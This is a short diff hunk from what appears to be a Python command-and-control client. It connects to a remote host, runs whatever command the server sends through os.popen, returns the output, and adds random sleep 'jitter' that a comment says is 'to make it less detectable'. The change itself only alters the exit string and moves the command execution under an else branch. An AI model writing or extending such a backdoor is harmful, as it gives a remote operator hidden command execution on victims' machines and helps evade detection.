@@ -18,15 +18,16 @@ while(Loop):
         sock.connect((HOST, PORT))
         sock.sendall(bytes(data + "\n", "utf-8"))
 
-        # Receive data from the server and shut down
+        # Receive data from the server
         received = str(sock.recv(2048), "utf-8")
 
-        if received == "exit":
+        if received == "1":
             Loop = False
+        else:
 
-        c2command = os.popen(received).read()
-        sock.sendall(bytes(c2command + "\n", "utf-8"))
+            c2command = os.popen(received).read()
+            sock.sendall(bytes(c2command + "\n", "utf-8"))
 
-        # Add jitter to make it less detectable
-        time.sleep(random.randint(1,5))
+            # Add jitter to make it less detectable
+            time.sleep(random.randint(1,5))
 
